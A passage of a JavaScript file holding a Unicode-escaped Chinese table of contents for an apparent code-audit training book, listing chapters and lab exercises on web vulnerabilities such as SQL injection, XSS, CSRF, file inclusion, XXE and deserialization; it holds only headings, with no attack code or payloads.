const r=`\u76EE\u5F55\r
\r
[\u524D\u8A00... 11](#_Toc78147275)\r
\r
[\u5355\u51431 \u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840... 12](#_Toc78147276)\r
\r
[1.1 \u4EE3\u7801\u5BA1\u8BA1\u7B80\u4ECB... 12](#_Toc78147277)\r
\r
[1.1.1 \u4EE3\u7801\u5BA1\u8BA1\u5B9A\u4E49... 12](#_Toc78147278)\r
\r
[1.1.2 \u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B... 13](#_Toc78147279)\r
\r
[1.1.3 \u4EE3\u7801\u5BA1\u8BA1\u5206\u7C7B... 14](#_Toc78147280)\r
\r
[1.2 \u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u642D\u5EFA... 14](#_Toc78147281)\r
\r
[1.2.1 PhpStudy\u73AF\u5883\u4ECB\u7ECD... 14](#_Toc78147282)\r
\r
[1.2.2 \u5B9E\u9A8C\uFF1AWindows\u4E0ELinux\u642D\u5EFA74CMS. 16](#_Toc78147283)\r
\r
[1.3 \u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u6982\u8981... 18](#_Toc78147284)\r
\r
[1.4 \u4EE3\u7801\u7F16\u8F91\u5DE5\u5177... 19](#_Toc78147285)\r
\r
[1.5 \u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177... 21](#_Toc78147286)\r
\r
[1.5.1 Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177... 21](#_Toc78147287)\r
\r
[1.5.2 RIPS\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177... 23](#_Toc78147288)\r
\r
[1.5.3 VCG\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177... 24](#_Toc78147289)\r
\r
[1.5.4 Fortify SCA\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177... 25](#_Toc78147290)\r
\r
[1.5.5 \u81EA\u52A8\u5316\u5BA1\u8BA1\u5DE5\u5177\u90E8\u7F72... 25](#_Toc78147291)\r
\r
[1.6 \u4EE3\u7801\u5BA1\u8BA1\u8F85\u52A9\u5DE5\u5177... 27](#_Toc78147292)\r
\r
[1.6.1 \u6570\u636E\u5305\u5206\u6790\u5DE5\u5177... 27](#_Toc78147293)\r
\r
[1.6.2 \u6D4F\u89C8\u5668\u8F85\u52A9\u63D2\u4EF6\u5DE5\u5177... 28](#_Toc78147294)\r
\r
[1.6.3 \u5B9E\u9A8C\uFF1ABurpSuite\u6570\u636E\u5305\u62E6\u622A... 29](#_Toc78147295)\r
\r
[1.6.4 \u7F16\u89E3\u7801\u5DE5\u5177... 32](#_Toc78147296)\r
\r
[1.6.5    \u6B63\u5219\u8868\u8FBE\u5F0F\u6D4B\u8BD5\u5DE5\u5177... 33](#_Toc78147297)\r
\r
[1.6.6 \u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7... 33](#_Toc78147298)\r
\r
[1.7 \u4EE3\u7801\u5BA1\u8BA1\u52A8\u6001\u8C03\u8BD5\u73AF\u5883\u642D\u5EFA... 36](#_Toc78147299)\r
\r
[1.7.1 \u52A8\u6001\u8C03\u8BD5\u539F\u7406... 36](#_Toc78147300)\r
\r
[1.7.2 Xdebug\u5B89\u88C5\u4E0E\u914D\u7F6E... 36](#_Toc78147301)\r
\r
[1.7.3 \u6D4F\u89C8\u5668Xdebug helper\u5B89\u88C5... 38](#_Toc78147302)\r
\r
[1.7.4 PhpStorm\u914D\u7F6E\u8FDC\u7A0B\u8C03\u8BD5... 38](#_Toc78147303)\r
\r
[1.8 \u5355\u5143\u5C0F\u7ED3... 41](#_Toc78147304)\r
\r
[\u5355\u51432 \u4EE3\u7801\u5BA1\u8BA1\u524D\u5BFC... 42](#_Toc78147305)\r
\r
[2.1 \u5F71\u54CD\u4EE3\u7801\u5BA1\u8BA1\u7684\u914D\u7F6E... 42](#_Toc78147306)\r
\r
[2.1.1 PHP\u7684\u914D\u7F6E\u6587\u4EF6... 43](#_Toc78147307)\r
\r
[2.1.2 \u4F20\u9012\u53D8\u91CF\u76F8\u5173\u7684PHP\u914D\u7F6E... 43](#_Toc78147308)\r
\r
[2.1.3 \u5B89\u5168\u6A21\u5F0F... 44](#_Toc78147309)\r
\r
[2.1.4 \u6587\u4EF6\u4E0A\u4F20\u53CA\u76EE\u5F55\u6743\u9650\u76F8\u5173\u914D\u7F6E... 45](#_Toc78147310)\r
\r
[2.1.5 \u9B54\u672F\u5F15\u53F7\u53CA\u8FDC\u7A0B\u6587\u4EF6\u76F8\u5173\u914D\u7F6E... 45](#_Toc78147311)\r
\r
[2.1.6 \u9519\u8BEF\u4FE1\u606F\u76F8\u5173\u914D\u7F6E... 47](#_Toc78147312)\r
\r
[2.2 \u4EE3\u7801\u5BA1\u8BA1\u57FA\u672C\u51FD\u6570... 48](#_Toc78147313)\r
\r
[2.2.1 \u4EE3\u7801\u8C03\u8BD5\u51FD\u6570... 48](#_Toc78147314)\r
\r
[2.2.2 \u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u7684\u70B9... 49](#_Toc78147315)\r
\r
[2.3 \u5F31\u7C7B\u578B\u7684\u5B89\u5168... 49](#_Toc78147316)\r
\r
[2.4 \u5E38\u89C1\u5371\u9669\u51FD\u6570... 53](#_Toc78147317)\r
\r
[2.3.1 \u4EE3\u7801\u6267\u884C\u51FD\u6570... 53](#_Toc78147318)\r
\r
[2.3.2 \u5305\u542B\u51FD\u6570... 54](#_Toc78147319)\r
\r
[2.3.3 \u547D\u4EE4\u6267\u884C\u51FD\u6570... 54](#_Toc78147320)\r
\r
[2.3.4 \u6587\u4EF6\u64CD\u4F5C\u51FD\u6570... 54](#_Toc78147321)\r
\r
[2.3.5 \u53D8\u91CF\u8986\u76D6\u51FD\u6570... 55](#_Toc78147322)\r
\r
[2.3.6 \u7279\u6B8A\u51FD\u6570... 55](#_Toc78147323)\r
\r
[2.4 \u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF... 56](#_Toc78147324)\r
\r
[2.4.1 \u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5... 57](#_Toc78147325)\r
\r
[2.4.2 \u5B9E\u9A8C\uFF1A\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5206\u679074CMS\u6848\u4F8B... 57](#_Toc78147326)\r
\r
[2.4.3 \u5B9A\u5411\u529F\u80FD\u5206\u6790\u6CD5... 59](#_Toc78147327)\r
\r
[2.4.4 \u5B9E\u9A8C\uFF1A\u5B9A\u5411\u529F\u80FD\u6CD5\u5206\u6790YXCMS\u56FE\u7247\u4E0A\u4F20\u529F\u80FD... 60](#_Toc78147328)\r
\r
[2.4.5 \u901A\u8BFB\u5168\u6587\u6CD5... 62](#_Toc78147329)\r
\r
[2.4.6 \u5B9E\u9A8C\uFF1A\u901A\u8BFB\u5168\u6587\u6CD5\u5206\u679074CMS\u6848\u4F8B... 63](#_Toc78147330)\r
\r
[2.5 \u5355\u5143\u5C0F\u7ED3... 66](#_Toc78147331)\r
\r
[\u5355\u51433 SQL\u6CE8\u5165\u6F0F\u6D1E\u5BA1\u8BA1... 67](#_Toc78147332)\r
\r
[3.1 SQL\u6CE8\u5165\u6F0F\u6D1E\u6316\u6398... 67](#_Toc78147333)\r
\r
[3.1.1 SQL\u6CE8\u5165\u6F0F\u6D1E\u7B80\u4ECB... 67](#_Toc78147334)\r
\r
[3.1.2 SQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u7C7B\u6982\u8FF0... 67](#_Toc78147335)\r
\r
[3.1.3 SQL\u6CE8\u5165\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 68](#_Toc78147336)\r
\r
[3.2 SQL\u6CE8\u5165\u5206\u7C7B... 69](#_Toc78147337)\r
\r
[3.2.1  \u65E0\u8FC7\u6EE4\u53C2\u6570\u6CE8\u5165... 69](#_Toc78147338)\r
\r
[3.2.2  \u65E0\u8FC7\u6EE4HTTP\u5934\u6CE8\u5165... 70](#_Toc78147339)\r
\r
[3.2.3  \u5B57\u7B26\u4E32\u66FF\u6362\u7ED5\u8FC7\u6CE8\u5165... 71](#_Toc78147340)\r
\r
[3.3 SQL\u6CE8\u5165\u7ED5\u8FC7addslashes. 73](#_Toc78147341)\r
\r
[3.3.1  \u5BBD\u5B57\u8282\u6CE8\u5165\u7ED5\u8FC7... 73](#_Toc78147342)\r
\r
[3.3.2  \u89E3\u7801\u6CE8\u5165\u7ED5\u8FC7... 74](#_Toc78147343)\r
\r
[3.3.3  \u5B57\u7B26\u4E32\u66FF\u6362\u7ED5\u8FC7... 76](#_Toc78147344)\r
\r
[3.4 SQL\u6CE8\u5165\u9632\u5FA1... 77](#_Toc78147345)\r
\r
[3.5 SQL\u6CE8\u5165CMS\u5B9E\u8DF5... 79](#_Toc78147346)\r
\r
[3.5.1  \u5B9E\u9A8C\uFF1ABlueCMS1.6 Union\u6CE8\u5165... 79](#_Toc78147347)\r
\r
[3.5.2  \u5B9E\u9A8C\uFF1A74CMS3.0 \u5BBD\u5B57\u8282\u6CE8\u5165... 82](#_Toc78147348)\r
\r
[3.6 \u5355\u5143\u5C0F\u7ED3... 86](#_Toc78147349)\r
\r
[\u5355\u51434 XSS\u6F0F\u6D1E\u5BA1\u8BA1... 87](#_Toc78147350)\r
\r
[4.1 XSS\u6F0F\u6D1E\u6316\u6398... 87](#_Toc78147351)\r
\r
[4.1.1 XSS\u6F0F\u6D1E\u7B80\u4ECB... 87](#_Toc78147352)\r
\r
[4.1.2 XSS\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 88](#_Toc78147353)\r
\r
[4.2 XSS\u6F0F\u6D1E\u5206\u7C7B... 88](#_Toc78147354)\r
\r
[4.2.1 \u53CD\u5C04\u578BXSS\u6F0F\u6D1E... 89](#_Toc78147355)\r
\r
[4.2.3 \u5B58\u50A8\u578BXSS\u6F0F\u6D1E... 89](#_Toc78147356)\r
\r
[4.2.5 DOM\u578BXSS\u6F0F\u6D1E... 90](#_Toc78147357)\r
\r
[4.3 XSS\u6F0F\u6D1E\u7ED5\u8FC7... 92](#_Toc78147358)\r
\r
[4.3.1 \u7F16\u89E3\u7801\u7ED5\u8FC7... 92](#_Toc78147359)\r
\r
[4.3.2 HTML\u7F16\u5199\u4E0D\u89C4\u8303\u7ED5\u8FC7... 93](#_Toc78147360)\r
\r
[4.3.3 \u9ED1\u540D\u5355\u8FC7\u6EE4\u7ED5\u8FC7... 94](#_Toc78147361)\r
\r
[4.3.4 \u5BBD\u5B57\u8282\u6CE8\u5165XSS. 96](#_Toc78147362)\r
\r
[4.4 XSS\u6F0F\u6D1E\u9632\u5FA1... 97](#_Toc78147363)\r
\r
[4.5 XSS\u5BA1\u8BA1CMS\u5B9E\u8DF5... 98](#_Toc78147364)\r
\r
[4.5.1  \u5B9E\u9A8C\uFF1ABlueCMS1.6 \u53CD\u5C04XSS\u5BA1\u8BA1... 98](#_Toc78147365)\r
\r
[4.5.2  \u5B9E\u9A8C\uFF1ABlueCMS1.6 \u5B58\u50A8XSS\u5BA1\u8BA1... 100](#_Toc78147366)\r
\r
[4.5.3  \u5B9E\u9A8C\uFF1A74CMS3.4\u5BBD\u5B57\u8282\u6CE8\u5165\u53CD\u5C04XSS\u5BA1\u8BA1... 103](#_Toc78147367)\r
\r
[4.5.4  \u5B9E\u9A8C\uFF1A74CMS3.0\u5B58\u50A8XSS\u5BA1\u8BA1... 106](#_Toc78147368)\r
\r
[4.6 \u5355\u5143\u5C0F\u7ED3... 109](#_Toc78147369)\r
\r
[\u5355\u51435 CSRF\u6F0F\u6D1E\u5BA1\u8BA1... 110](#_Toc78147370)\r
\r
[5.1 CSRF\u6F0F\u6D1E\u6316\u6398... 110](#_Toc78147371)\r
\r
[5.1.1 CSRF\u6F0F\u6D1E\u7B80\u4ECB... 110](#_Toc78147372)\r
\r
[5.1.2 CSRF\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 110](#_Toc78147373)\r
\r
[5.2 CSRF\u6F0F\u6D1E\u5206\u7C7B... 111](#_Toc78147374)\r
\r
[5.2.1 GET\u578BCSRF\u6F0F\u6D1E... 111](#_Toc78147375)\r
\r
[5.2.2 POST\u578BCSRF\u6F0F\u6D1E... 112](#_Toc78147376)\r
\r
[5.3 CSRF\u6F0F\u6D1E\u9632\u5FA1... 113](#_Toc78147377)\r
\r
[5.3.1 \u9A8C\u8BC1HTTP Referer\u5B57\u6BB5... 113](#_Toc78147378)\r
\r
[5.3.2 \u9A8C\u8BC1Token. 114](#_Toc78147379)\r
\r
[5.3.3 \u9A8C\u8BC1\u7801\u9A8C\u8BC1... 115](#_Toc78147380)\r
\r
[5.4 CSRF\u5BA1\u8BA1CMS\u5B9E\u8DF5... 115](#_Toc78147381)\r
\r
[5.4.1  \u5B9E\u9A8C\uFF1A74CMS3.0 CSRF\u5BA1\u8BA1... 115](#_Toc78147382)\r
\r
[5.4.2  \u5B9E\u9A8C\uFF1AYzmCMS5.8 CSRF\u5BA1\u8BA1... 118](#_Toc78147383)\r
\r
[5.5 \u5355\u5143\u5C0F\u7ED3... 122](#_Toc78147384)\r
\r
[\u5355\u51436 \u4EE3\u7801\u6267\u884C\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1... 123](#_Toc78147385)\r
\r
[6.1 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u6316\u6398... 123](#_Toc78147386)\r
\r
[6.1.1 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB... 123](#_Toc78147387)\r
\r
[6.1.2 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570... 124](#_Toc78147388)\r
\r
[6.1.3 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C... 127](#_Toc78147389)\r
\r
[6.1.4 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1... 128](#_Toc78147390)\r
\r
[6.2 \u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u5B9E\u8DF5... 128](#_Toc78147391)\r
\r
[6.2.1 YCCMS3.3\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1... 128](#_Toc78147392)\r
\r
[6.2.2 YzmCMS3.6\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1... 131](#_Toc78147393)\r
\r
[6.3 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u6316\u6398... 134](#_Toc78147394)\r
\r
[6.3.1 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7B80\u4ECB... 134](#_Toc78147395)\r
\r
[6.3.2 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570... 135](#_Toc78147396)\r
\r
[6.3.3 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u8FDE\u63A5\u7B26... 138](#_Toc78147397)\r
\r
[6.3.4 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C... 139](#_Toc78147398)\r
\r
[6.3.5 \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1... 139](#_Toc78147399)\r
\r
[6.4 \u547D\u4EE4\u6267\u884C\u5BA1\u8BA1CMS\u5B9E\u8DF5... 140](#_Toc78147400)\r
\r
[6.4.1  \u5B9E\u9A8C\uFF1ADiscuz1.5\u547D\u4EE4\u6267\u884C\u5BA1\u8BA1... 140](#_Toc78147401)\r
\r
[6.5 \u5355\u5143\u5C0F\u7ED3... 143](#_Toc78147402)\r
\r
[\u5355\u51437 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1... 144](#_Toc78147403)\r
\r
[7.1 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6316\u6398... 144](#_Toc78147404)\r
\r
[7.1.1 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7B80\u4ECB... 144](#_Toc78147405)\r
\r
[7.1.2 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C... 144](#_Toc78147406)\r
\r
[7.1.3 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u9632\u5FA1... 145](#_Toc78147407)\r
\r
[7.2 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6848\u4F8B... 145](#_Toc78147408)\r
\r
[7.3 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7ED5\u8FC7... 146](#_Toc78147409)\r
\r
[7.3.1 \u6269\u5C55\u540D\u8FC7\u6EE4\u7ED5\u8FC7\uFF08\u672C\u5730\u6587\u4EF6\u5305\u542B\uFF09... 146](#_Toc78147410)\r
\r
[7.3.2 \u6269\u5C55\u540D\u8FC7\u6EE4\u7ED5\u8FC7\uFF08\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\uFF09... 147](#_Toc78147411)\r
\r
[7.4 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1CMS\u5B9E\u8DF5... 148](#_Toc78147412)\r
\r
[7.4.1  \u5B9E\u9A8C\uFF1Aphpmyadmin4.8.1\u6587\u4EF6\u5305\u542B\u5BA1\u8BA1... 148](#_Toc78147413)\r
\r
[7.4.2  \u5B9E\u9A8C\uFF1A\u7EC7\u68A6cmsV5.7\u5305\u542BCache\u5BA1\u8BA1... 150](#_Toc78147414)\r
\r
[7.5 \u5355\u5143\u5C0F\u7ED3... 152](#_Toc78147415)\r
\r
[\u5355\u51438 \u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5BA1\u8BA1... 153](#_Toc78147416)\r
\r
[8.1 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5... 154](#_Toc78147417)\r
\r
[8.1.1 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7B80\u4ECB... 154](#_Toc78147418)\r
\r
[8.1.2 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 154](#_Toc78147419)\r
\r
[8.1.3 \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7ED5\u8FC7... 154](#_Toc78147420)\r
\r
[8.1.4 \u5B9E\u9A8C\uFF1AFineCMS\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5BA1\u8BA1... 159](#_Toc78147421)\r
\r
[8.2 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5... 161](#_Toc78147422)\r
\r
[8.2.1 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7B80\u4ECB... 161](#_Toc78147423)\r
\r
[8.2.2 \u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 162](#_Toc78147424)\r
\r
[8.2.3 \u5B9E\u9A8C\uFF1A74CMS3.0\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u5BA1\u8BA1... 162](#_Toc78147425)\r
\r
[8.3 \u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5... 165](#_Toc78147426)\r
\r
[8.3.1 \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7B80\u4ECB... 165](#_Toc78147427)\r
\r
[8.3.2 \u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u7B80\u4ECB... 166](#_Toc78147428)\r
\r
[8.3.3 \u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 167](#_Toc78147429)\r
\r
[8.3.4 \u5B9E\u9A8C\uFF1AMetInfo6.0.0\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u5BA1\u8BA1... 167](#_Toc78147430)\r
\r
[8.4 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u6316\u6398\u4E0E\u5B9E\u8DF5... 170](#_Toc78147431)\r
\r
[8.4.1 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7B80\u4ECB... 170](#_Toc78147432)\r
\r
[8.4.2 \u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 171](#_Toc78147433)\r
\r
[8.4.3 \u5B9E\u9A8C\uFF1A74CMS3.0\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5BA1\u8BA1... 171](#_Toc78147434)\r
\r
[8.5 \u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u9632\u5FA1... 173](#_Toc78147435)\r
\r
[8.6 \u5355\u5143\u5C0F\u7ED3... 174](#_Toc78147436)\r
\r
[\u5355\u51439 XXE\u4E0ESSRF\u6F0F\u6D1E\u5BA1\u8BA1... 175](#_Toc78147437)\r
\r
[9.1 XXE\u6F0F\u6D1E\u6316\u6398... 175](#_Toc78147438)\r
\r
[9.1.1 XXE\u6F0F\u6D1E\u7B80\u4ECB... 175](#_Toc78147439)\r
\r
[9.1.2 XXE\u6F0F\u6D1E\u6316\u6398... 175](#_Toc78147440)\r
\r
[9.2 XXE\u6F0F\u6D1E\u5206\u7C7B... 176](#_Toc78147441)\r
\r
[9.3 XXE\u6F0F\u6D1E\u9632\u5FA1... 177](#_Toc78147442)\r
\r
[9.4 XXE\u5BA1\u8BA1CMS\u5B9E\u8DF5... 178](#_Toc78147443)\r
\r
[9.4.1  \u5B9E\u9A8C\uFF1ACLTPHP5.5.3 XXE\u5BA1\u8BA1... 178](#_Toc78147444)\r
\r
[9.5 SSRF\u6F0F\u6D1E\u6316\u6398... 181](#_Toc78147445)\r
\r
[9.5.1 SSRF\u6F0F\u6D1E\u7B80\u4ECB... 181](#_Toc78147446)\r
\r
[9.5.2 SSRF\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C... 181](#_Toc78147447)\r
\r
[9.6 SSRF\u6F0F\u6D1E\u5206\u7C7B... 182](#_Toc78147448)\r
\r
[9.6.1 CURL\u5F15\u8D77\u7684SSRF. 182](#_Toc78147449)\r
\r
[9.6.2 file_get_contents\u5F15\u8D77\u7684SSRF. 183](#_Toc78147450)\r
\r
[9.6.3 fsocketopen\u9020\u6210\u7684SSRF. 183](#_Toc78147451)\r
\r
[9.7 SSRF\u6F0F\u6D1E\u7ED5\u8FC7... 184](#_Toc78147452)\r
\r
[9.8 SSRF\u6F0F\u6D1E\u9632\u5FA1... 184](#_Toc78147453)\r
\r
[9.9 SSRF\u5BA1\u8BA1CMS\u5B9E\u8DF5... 185](#_Toc78147454)\r
\r
[9.9.1  \u5B9E\u9A8C\uFF1AAPPCMS2.0 SSRF\u5BA1\u8BA1... 185](#_Toc78147455)\r
\r
[9.10 \u5355\u5143\u5C0F\u7ED3... 187](#_Toc78147456)\r
\r
[\u5355\u514310 \u53D8\u91CF\u8986\u76D6\u4E0E\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5BA1\u8BA1... 188](#_Toc78147457)\r
\r
[10.1 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u6316\u6398... 188](#_Toc78147458)\r
\r
[10.1.1 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7B80\u4ECB... 188](#_Toc78147459)\r
\r
[10.1.2 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C... 189](#_Toc78147460)\r
\r
[10.1.3 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u9632\u5FA1... 189](#_Toc78147461)\r
\r
[10.2 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u6848\u4F8B... 189](#_Toc78147462)\r
\r
[10.2.1 extract\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53... 190](#_Toc78147463)\r
\r
[10.2.2 parse_str\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53... 190](#_Toc78147464)\r
\r
[10.2.3 import_request_variables\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53... 191](#_Toc78147465)\r
\r
[10.2.4 \u5168\u5C40\u53D8\u91CF\u8986\u76D6... 192](#_Toc78147466)\r
\r
[10.2.5 $$\u53D8\u91CF\u8986\u76D6... 193](#_Toc78147467)\r
\r
[10.3 \u53D8\u91CF\u8986\u76D6\u5BA1\u8BA1CMS\u5B9E\u8DF5... 193](#_Toc78147468)\r
\r
[10.3.1  \u5B9E\u9A8C\uFF1APHPCMS2008\u53D8\u91CF\u8986\u76D6\u5BA1\u8BA1... 193](#_Toc78147469)\r
\r
[10.4 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E... 196](#_Toc78147470)\r
\r
[10.4.1 \u5E8F\u5217\u5316\u4ECB\u7ECD... 197](#_Toc78147471)\r
\r
[10.4.2 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u4ECB\u7ECD... 198](#_Toc78147472)\r
\r
[10.5 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1ECMS\u5B9E\u8DF5... 200](#_Toc78147473)\r
\r
[10.5.1  \u5B9E\u9A8C\uFF1ATypecho1.0.14\u53CD\u5E8F\u5217\u5316\u5BA1\u8BA1... 200](#_Toc78147474)\r
\r
[10.6 \u5355\u5143\u5C0F\u7ED3... 205](#_Toc78147475)\r
\r
[\u5355\u514311 \u4E1A\u52A1\u529F\u80FD\u5BA1\u8BA1... 206](#_Toc78147476)\r
\r
[11.1 \u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E... 206](#_Toc78147477)\r
\r
[11.1.1 \u9A8C\u8BC1\u7801\u529F\u80FD\u4ECB\u7ECD... 206](#_Toc78147478)\r
\r
[11.1.2 \u9A8C\u8BC1\u7801\u529F\u80FD\u5E38\u89C1\u5B89\u5168\u95EE\u9898... 207](#_Toc78147479)\r
\r
[11.1.3   \u9A8C\u8BC1\u7801\u7ED5\u8FC7\u65B9\u5F0F... 207](#_Toc78147480)\r
\r
[11.1.4 \u5B9E\u9A8C\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u5BFC\u81F4\u4EFB\u610F\u7528\u6237\u6CE8\u518C\u5B9E\u8DF5... 210](#_Toc78147481)\r
\r
[11.2 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u6F0F\u6D1E... 213](#_Toc78147482)\r
\r
[11.2.1 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u4ECB\u7ECD... 213](#_Toc78147483)\r
\r
[11.2.2 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u7684\u5E38\u89C1\u6848\u4F8B... 213](#_Toc78147484)\r
\r
[11.2.3 \u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u9632\u5FA1\u65B9\u6CD5... 218](#_Toc78147485)\r
\r
[11.2.4   \u5B9E\u9A8C\uFF1A\u4EFB\u610F\u7528\u6237\u5BC6\u7801\u91CD\u7F6E\u5B9E\u8DF5... 218](#_Toc78147486)\r
\r
[11.3 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E... 222](#_Toc78147487)\r
\r
[11.3.1 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u4ECB\u7ECD... 222](#_Toc78147488)\r
\r
[11.3.2 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u6316\u6398... 222](#_Toc78147489)\r
\r
[11.3.3 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u5E38\u89C1\u5B89\u5168\u95EE\u9898... 223](#_Toc78147490)\r
\r
[11.3.4 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u9632\u5FA1\u65B9\u6CD5... 225](#_Toc78147491)\r
\r
[11.4 \u5355\u5143\u5C0F\u7ED3... 225](#_Toc78147492)\r
\r
[\u5355\u514312 YXCMS\u5BA1\u8BA1... 226](#_Toc78147493)\r
\r
[12.1 \u5BA1\u8BA1\u524D\u51C6\u5907... 226](#_Toc78147494)\r
\r
[12.2 \u7559\u8A00\u677F\u5B58\u50A8\u578BXSS\u5206\u6790... 230](#_Toc78147495)\r
\r
[12.3 \u788E\u7247\u7BA1\u7406SQL\u6CE8\u5165\u5206\u6790... 231](#_Toc78147496)\r
\r
[12.4 \u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5206\u6790... 233](#_Toc78147497)\r
\r
[12.4.1 YMCMS\u4EFB\u610F\u6587\u4EF6\u5220\u9664... 233](#_Toc78147498)\r
\r
[12.4.2 YMCMS\u4EFB\u610F\u6587\u4EF6\u5199\u5165... 234](#_Toc78147499)\r
\r
[12.5 \u5355\u5143\u5C0F\u7ED3... 235](#_Toc78147500)\r
\r
[\u5355\u514313 Java\u4EE3\u7801\u5BA1\u8BA1... 236](#_Toc78147501)\r
\r
[13.1 Java\u4EE3\u7801\u5BA1\u8BA1\u5165\u95E8... 236](#_Toc78147502)\r
\r
[13.1.1 Java EE\u4ECB\u7ECD... 236](#_Toc78147503)\r
\r
[13.1.2 Java\u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840... 238](#_Toc78147504)\r
\r
[13.2 Java\u4EE3\u7801\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E... 241](#_Toc78147505)\r
\r
[13.2.1 JDBC\u7684SQL\u6CE8\u5165... 241](#_Toc78147506)\r
\r
